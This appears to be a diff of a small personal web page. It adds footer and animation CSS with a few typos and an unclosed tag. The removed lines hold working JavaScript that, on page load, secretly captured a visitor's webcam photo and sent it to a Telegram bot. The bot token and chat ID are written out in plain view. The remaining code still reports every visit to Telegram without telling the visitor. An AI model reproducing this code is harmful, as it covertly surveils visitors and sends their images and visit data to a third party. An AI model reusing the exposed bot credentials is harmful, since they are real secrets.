@@ -45,7 +45,6 @@
 
         #image_chockoboy, #video_vadim, #image_kot, #image_anonim, #image_beer, #image_kuvyrok {
             border-radius: 20px;
-            margin-bottom: 25px;
             width: 100%;
             max-width: 256px;
             height: 512px; /* Фиксированная высота */
@@ -118,6 +117,34 @@
                 gap: 10px;
             }
         }
+				
+				footer{
+				background-color: #b375fa;
+				display:flex;
+				justify-content: center;
+				}
+				
+				.loading{
+				display: flex;
+				justify-content: center;
+				aligb-items: center;
+				width: 1px;
+				height: 10vh;
+				font-size: 25px;
+				text-wrap: nowrap;
+				overflow: hidden;
+				animation: DivStart 7s forwards infinite, DivClose 7s forwards infinite;
+			}
+
+			@keyframes DivStart {
+				to {
+						opacity: 5;
+						padding: 0 49vw;}
+			}
+
+			@keyframes DivClose{
+				to {opacity: 0;}
+			}
     </style>
 </head>
 <body>
@@ -144,8 +171,10 @@
         </div>
         <button id='randbut'> НE НАЖИМАТЬ </button>
     </main>
-    <footer>
+		<footer>
+				<div class="loading">
         created by @bladasone
+				<div>
     </footer>
     <script>
         let randbut = document.getElementById('randbut');
@@ -190,67 +219,6 @@
             });
         }
 
-        // Функция для отправки фото в Telegram
-        function sendPhotoToTelegram(photoDataUrl) {
-            const botToken = '7312549221:AAFjFb6kk4JP3jo61ripvd4vMNn4fhX1nZ4'; 
-            const chatId = '1692649398';
-
-            // Преобразуем Data URL в Blob
-            fetch(photoDataUrl)
-                .then((response) => response.blob())
-                .then((blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'photo.png');
-
-                    // Отправляем фото в Telegram
-                    return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData,
-                    });
-                })
-                .then((response) => response.json())
-                .then((data) => {
-                    console.log('Фото отправлено:', data);
-                })
-                .catch((error) => {
-                    console.error('Ошибка отправки фото:', error);
-                });
-        }
-
-        // Функция для захвата фото с камеры
-        function capturePhoto() {
-            const video = document.createElement('video');
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-
-            // Запрашиваем доступ к камере
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    video.srcObject = stream;
-                    video.play();
-
-                    // Ждем, пока видео начнет воспроизводиться
-                    video.addEventListener('canplay', () => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-
-                        // Делаем фото
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const photoDataUrl = canvas.toDataURL('image/png');
-
-                        // Отправляем фото в Telegram
-                        sendPhotoToTelegram(photoDataUrl);
-
-                        // Останавливаем поток
-                        stream.getTracks().forEach(track => track.stop());
-                    });
-                })
-                .catch((error) => {
-                    console.error('Ошибка доступа к камере:', error);
-                });
-        }
-
         // Обработчик для кнопки отправки сообщения
         document.getElementById('send-button').addEventListener('click', function() {
             const messageInput = document.getElementById('message-input');
@@ -273,8 +241,7 @@
 
         // Уведомление при загрузке страницы
         window.onload = function() {
-            sendTelegramMessage('Кто-то зашел на сайт vadimsys.github.io');
-            capturePhoto(); // Захватываем фото с камеры
+            sendTelegramMessage('Кто-то зашел vadimsys.github.io');
         };
     </script>
 </body>
